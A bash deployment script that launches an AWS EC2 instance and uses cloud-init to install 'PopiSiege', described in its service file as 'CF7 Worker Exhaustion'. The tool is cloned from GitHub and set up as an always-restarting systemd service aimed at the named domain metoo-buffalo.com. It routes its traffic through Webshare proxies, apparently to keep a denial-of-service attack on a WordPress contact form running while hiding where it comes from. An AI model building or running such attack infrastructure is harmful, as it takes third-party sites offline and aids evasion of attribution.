#!/usr/bin/env bash
# deploy_aws.sh — Launch a t3.nano in ap-south-1 (Mumbai), deploy PopiSiege,
# configure Webshare backbone proxies, and start as a systemd service.
#
# Usage:
#   export AWS_ACCESS_KEY_ID=...
#   export AWS_SECRET_ACCESS_KEY=...
#   bash deploy_aws.sh
#
# Requires: aws cli v2, your key pair, and proxies_webshare_backbone_creds.txt
# present in the same directory as this script.

set -euo pipefail

REGION="ap-south-1"
INSTANCE_TYPE="t3.nano"
AMI="ami-0f5ee92e2d63afc18"   # Ubuntu 22.04 LTS arm64 ap-south-1 (update if needed)
KEY_NAME="${AWS_KEY_PAIR:-popisiege-key}"
SG_NAME="popisiege-sg"
TAG_NAME="popisiege"
REPO="https://github.com/orospor/PopiSiege.git"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
CREDS_FILE="$SCRIPT_DIR/proxies_webshare_backbone_creds.txt"

if [[ ! -f "$CREDS_FILE" ]]; then
  echo "ERROR: $CREDS_FILE not found. Create it (line 1 = username, line 2 = password)."
  exit 1
fi

WEBSHARE_USER=$(sed -n '1p' "$CREDS_FILE")
WEBSHARE_PASS=$(sed -n '2p' "$CREDS_FILE")

echo "=== PopiSiege AWS Deploy — region=$REGION ==="

# ── 1. Security group ──────────────────────────────────────────────────────
SG_ID=$(aws ec2 describe-security-groups \
  --region "$REGION" \
  --filters "Name=group-name,Values=$SG_NAME" \
  --query 'SecurityGroups[0].GroupId' --output text 2>/dev/null || echo "None")

if [[ "$SG_ID" == "None" || -z "$SG_ID" ]]; then
  echo "Creating security group $SG_NAME..."
  SG_ID=$(aws ec2 create-security-group \
    --region "$REGION" \
    --group-name "$SG_NAME" \
    --description "PopiSiege outbound-only" \
    --query 'GroupId' --output text)
  # SSH only from your current IP
  MY_IP=$(curl -s https://checkip.amazonaws.com)
  aws ec2 authorize-security-group-ingress \
    --region "$REGION" \
    --group-id "$SG_ID" \
    --protocol tcp --port 22 --cidr "${MY_IP}/32"
  echo "Security group: $SG_ID (SSH allowed from $MY_IP)"
else
  echo "Security group exists: $SG_ID"
fi

# ── 2. Key pair ────────────────────────────────────────────────────────────
KEY_FILE="$HOME/.ssh/${KEY_NAME}.pem"
if ! aws ec2 describe-key-pairs --region "$REGION" --key-names "$KEY_NAME" &>/dev/null; then
  echo "Creating key pair $KEY_NAME..."
  aws ec2 create-key-pair \
    --region "$REGION" \
    --key-name "$KEY_NAME" \
    --query 'KeyMaterial' --output text > "$KEY_FILE"
  chmod 600 "$KEY_FILE"
  echo "Key saved: $KEY_FILE"
else
  echo "Key pair exists: $KEY_NAME"
fi

# ── 3. User-data (cloud-init) ──────────────────────────────────────────────
USER_DATA=$(cat <<EOF
#!/bin/bash
set -e
apt-get update -qq
apt-get install -y python3-pip git

# Clone repo
git clone $REPO /opt/popisiege
cd /opt/popisiege
pip3 install -q -r requirements.txt

# Write Webshare creds (not in git)
cat > /opt/popisiege/proxies_webshare_backbone_creds.txt <<CREDS
$WEBSHARE_USER
$WEBSHARE_PASS
CREDS
chmod 600 /opt/popisiege/proxies_webshare_backbone_creds.txt

# Systemd service for popisiege (metoo-buffalo, continuous)
cat > /etc/systemd/system/popisiege.service <<UNIT
[Unit]
Description=PopiSiege CF7 Worker Exhaustion
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
WorkingDirectory=/opt/popisiege
ExecStart=/usr/bin/python3 /opt/popisiege/popisiege.py --target metoo-buffalo.com
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
UNIT

systemctl daemon-reload
systemctl enable popisiege
systemctl start popisiege
EOF
)

# ── 4. Launch instance ─────────────────────────────────────────────────────
echo "Launching $INSTANCE_TYPE in $REGION..."
INSTANCE_ID=$(aws ec2 run-instances \
  --region "$REGION" \
  --image-id "$AMI" \
  --instance-type "$INSTANCE_TYPE" \
  --key-name "$KEY_NAME" \
  --security-group-ids "$SG_ID" \
  --user-data "$USER_DATA" \
  --tag-specifications "ResourceType=instance,Tags=[{Key=Name,Value=$TAG_NAME}]" \
  --query 'Instances[0].InstanceId' --output text)

echo "Instance launched: $INSTANCE_ID"
echo "Waiting for running state..."
aws ec2 wait instance-running --region "$REGION" --instance-ids "$INSTANCE_ID"

PUBLIC_IP=$(aws ec2 describe-instances \
  --region "$REGION" \
  --instance-ids "$INSTANCE_ID" \
  --query 'Reservations[0].Instances[0].PublicIpAddress' --output text)

echo ""
echo "=== DONE ==="
echo "Instance  : $INSTANCE_ID"
echo "Public IP : $PUBLIC_IP"
echo "SSH       : ssh -i $KEY_FILE ubuntu@$PUBLIC_IP"
echo ""
echo "Give cloud-init ~2 min to finish setup, then:"
echo "  ssh -i $KEY_FILE ubuntu@$PUBLIC_IP"
echo "  sudo journalctl -u popisiege -f   # live logs"
echo "  sudo systemctl status popisiege"
